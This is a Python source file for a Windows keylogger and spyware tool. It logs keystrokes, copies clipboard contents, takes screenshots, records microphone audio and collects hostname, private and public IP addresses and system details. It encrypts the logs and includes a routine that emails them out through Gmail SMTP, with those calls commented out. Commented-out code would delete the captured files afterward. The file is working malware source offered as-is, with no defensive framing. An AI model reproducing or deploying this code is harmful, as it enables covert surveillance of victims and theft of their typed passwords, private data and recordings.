#importing all the libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process,freeze_support
from PIL import ImageGrab


keys_information  = "key_log.txt"
system_information = "system.txt"
clipboard_info = "clipboard.txt"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_info_e = "e_clipboard.txt"

from_address = "dummy@gmail.com"
from_password = "dummypassword"
toaddr = "dummy@gmail.com"

username = getpass.getuser()

key = "T6SKgZgknBO5v2JOn2MxKz8GChIUfwCvHq6zebRy8Lk="

microphone_time = 10
audio_information = "audio.wav"

time_iteration = 15
number_of_iterations_end = 3


file_path = "C:\\Users\\abhis\Downloads\\PythonKeylogger"
extend = "\\"

file_merge = file_path + extend

def send_email(filename, attachment, toaddr):
    
    fromaddr = from_address
    msg =MIMEMultipart()
    
    # storing the senders email address   
    msg['From'] = fromaddr 
    
    # storing the receivers email address  
    msg['To'] = toaddr 
    
    # storing the subject  
    msg['Subject'] = "Subject of the Mail"
    
    # string to store the body of the mail 
    body = "Body_of_the_mail"

    filename = filename
    attachment = open(attachment, "rb") 

    # instance of MIMEBase and named as p 
    p = MIMEBase('application', 'octet-stream') 
    
    # To change the payload into encoded form 
    p.set_payload((attachment).read()) 
    
    # encode into base64 
    encoders.encode_base64(p) 
    
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
    
    # attach the instance 'p' to instance 'msg' 
    msg.attach(p) 
    
    # creates SMTP session 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    
    # start TLS for security 
    s.starttls() 
    
    # Authentication 
    s.login(fromaddr, from_password) 
    
    # Converts the Multipart msg into a string 
    text = msg.as_string() 
    
    # sending the mail 
    s.sendmail(fromaddr, toaddr, text) 
    
    # terminating the session 
    s.quit() 

#send_email(keys_information, file_path + extend + keys_information, toaddr)

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + "\n")
        
        except Exception:
            f.write("Coudn't get Public IP Address (most likely max query)")
        
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

#computer_information()

def clipboard_information():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write('Clipboard Data: \n' + pasted_data)

        except Exception:
            f.write("Clipboard could not be copied")

#clipboard_information()

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate= fs, channels= 2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

#microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

#screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count +=1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []



    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\t')
                    f.close()
                elif k.find('enter') > 0:
                    f.write('\n')
                    f.close()
                elif k.find('backspace') > 0:
                    f.write('')
                    f.close()
                elif k.find('Key') == -1:
                    f.write(k)


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press= on_press, on_release= on_release) as listener:
        listener.join()
    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information , "w") as f:
            f.write(' ')
        screenshot()
        #send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        clipboard_information()
        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time + time_iteration


files_to_encrypt = [file_merge + system_information, file_merge + clipboard_info, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_info_e, file_merge + keys_information_e]

count = 0 

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
       data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], "wb") as f:
        f.write(encrypted)
    
    #send_email(encrypted_file_names[0], encrypted_file_names[count], toaddr)

    count += 1

time.sleep(120)

# delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
# for file in delete_files:
#     os.remove(file_merge + file)



